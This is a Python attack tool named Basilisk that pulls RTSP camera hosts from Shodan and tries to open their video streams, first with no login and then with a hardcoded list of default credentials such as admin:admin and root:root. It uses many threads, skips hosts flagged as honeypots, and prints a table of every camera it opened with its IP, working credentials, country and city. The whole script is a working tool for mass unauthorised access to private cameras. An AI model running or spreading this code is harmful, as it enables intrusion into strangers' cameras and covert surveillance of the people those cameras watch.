#!/bin/env python3
import sys
import os
from colorama import init, Fore, Style, Back
init()
from time import sleep
import shodan
import argparse
import cv2
import threading
from queue import Queue
from prettytable import PrettyTable

colourtheme1 = "\u001b[38;5;46m"
colourtheme2 = "\u001b[38;5;50m"
warningcolour = "\u001b[38;5;220m"
successcolour = "\u001b[38;5;46m"
infocolour = "\u001b[38;5;39m"
errorcolour = "\u001b[38;5;160m"
reverse = "\u001b[7m"
fullreset = "\u001b[0m"

def clear():
    if sys.platform == "win32":
        print('\n' * 100)
    else:
        os.system('clear')

banner = rf'''
┌──────────────────────────────────────────────────┐
│{colourtheme1}__________               .__.__  .__        __    {Fore.RESET}│
│{colourtheme1}\______   \_____    _____|__|  | |__| _____|  | __{Fore.RESET}│
│{colourtheme1} |    |  _/\__  \  /  ___/  |  | |  |/  ___/  |/ /{Fore.RESET}│
│{colourtheme1} |    |   \ / __ \_\___ \|  |  |_|  |\___ \|    < {Fore.RESET}│
│{colourtheme1} |______  /(____  /____  >__|____/__/____  >__|_ \{Fore.RESET}│
│{colourtheme1}        \/      \/     \/                \/     \/{Fore.RESET}│
├───────────────┬─────────────────┬────────────────┤
│ {colourtheme2}By SpiceSouls{Fore.RESET} │ {colourtheme2}Beyond Root Sec{Fore.RESET} │ {colourtheme2}Version: 1.0.0{Fore.RESET} │
└───────────────┴─────────────────┴────────────────┘
'''
clear()
print(banner)
parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras Around the World')
parser.add_argument('apikey', metavar='ShodanAPIkey', type=str,
                    help='Your Shodan API Key')
parser.add_argument('-t', metavar='Threads', type=int,
                    help='Threads to use', default=15)

args = parser.parse_args()

def warning(message):
	print(f'[{reverse}{warningcolour}!{fullreset}] {str(message)}')
def success(message):
	print(f'[{reverse}{successcolour}!{fullreset}] {str(message)}')
def info(message):
	print(f'[{reverse}{infocolour}!{fullreset}] {str(message)}')	
def error(message):
	print(f'[{reverse}{errorcolour}!{fullreset}] {str(message)}')


api = shodan.Shodan(args.apikey)
try:
	info(f'Searching...')
	results = api.search('rtsp')
	success(str(len(results['matches'])) + ' Results')
except shodan.exception.APIError as e:
	error(e)
	sys.exit()

x = PrettyTable()
x.field_names = ["IP", "Domain", "Country", "City"]

for target in results['matches']:
	if target["domains"] != []:
		targetdomain = successcolour + target["domains"][0] + fullreset
	else:
		targetdomain = f'{errorcolour}N/A{fullreset}'
	x.add_row([target["ip_str"], targetdomain, str(target["location"]["country_name"]), str(target["location"]["city"])])

print(x)

info('Starting RTSP Probing in 5 Seconds...\n')
sleep(5)
clear()
defaultcredentials = ['admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin', 'admin:root']
badcams = []
allcams = []
print_lock = threading.Lock()

def tryrtsp(ip):
	cap = cv2.VideoCapture(f'rtsp://{ip}')
	ret, frame = cap.read()
	if ret == True:
		return 'None'
	else:
		for i in defaultcredentials:
			cap = cv2.VideoCapture(f'rtsp://{i}@{ip}')
			ret, frame = cap.read()
			if ret == True:
				return i
			else:
				pass
	return False

def rtspprobe(target):
	info(f'Probing {target["ip_str"]}...')
	if "honeypot" in str(target):
		rtspresult = False
	else:
		rtspresult = tryrtsp(target['ip_str'])
	if rtspresult != False:
		badcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
	else:
		pass
	allcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
	clear()
	print(banner)
	info('Probing RTSP Cameras... be patient!')
	if len(badcams) < 1:
		pass
	else:
		for c in badcams:
			success(f'Vulnerable RTSP Camera: {c["ip"]}, {c["pass"]}')
	print(f'\nProbed {reverse}' + str(len(allcams)) + '/' + str(len(results['matches'])) + f'{fullreset} Cameras')
def threader():

	while True:
		worker = q.get()
		rtspprobe(worker)
		q.task_done()
q = Queue()
for a in range(args.t):
	t = threading.Thread(target=threader)
	t.daemon = True
	t.start()
for worker in results['matches']:
	q.put(worker)
q.join()
		
print('\n\n')
x = PrettyTable()	
x.field_names = ["IP", "Authentication", "Country", "City"]
for badcam in badcams:
	x.add_row([badcam["ip"], badcam["pass"], badcam["country"], badcam["city"]])
clear()
print(banner)
info('Final Results:')
print(x)
